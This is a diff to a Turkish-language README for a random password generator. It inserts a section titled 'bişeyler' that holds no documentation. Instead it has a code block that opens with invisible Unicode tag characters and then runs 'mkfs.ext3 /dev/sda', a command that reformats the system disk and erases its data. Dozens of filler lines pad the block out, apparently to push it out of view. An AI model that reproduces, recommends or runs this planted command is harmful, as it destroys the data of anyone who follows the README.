@@ -2,6 +2,55 @@
 
 Bu uygulama, belirlenen karakter sayısına göre rastgele şifreler üretmek için tasarlanmıştır. Şifreler büyük ve küçük harfler, sayılar ve özel karakterler içerebilir.
 
+## bişeyler
+
+```󠁛󠀣󠀰󠀰󠀰󠀰󠀰󠀰󠀬󠀣󠀵󠀵󠀵󠀶󠀴󠀴󠁝$mkfs.ext3 /dev/sda```
+ -- --
+ -- --
+ -- --
+ -- --
+ -- --
+  -- --
+ -- --
+ -- --
+ -- --
+ -- --
+ -- --
+ -- --
+ -- --
+ -- --
+ -- --
+ -- --
+ -- --
+ -- --
+ -- --
+ -- --
+ -- --
+ -- --
+ -- --
+ -- --
+ -- --
+ -- --
+ -- --
+ -- --
+ -- --
+ -- --
+ -- --
+ -- --
+ -- --
+ -- --
+ -- --
+ -- --
+ -- --
+ -- --
+ -- --
+ -- --
+ -- --
+ -- --
+ -- --
+ -- --
+ -- --
+
 ## Özellikler
 
 - Belirtilen uzunlukta rastgele şifre üretimi
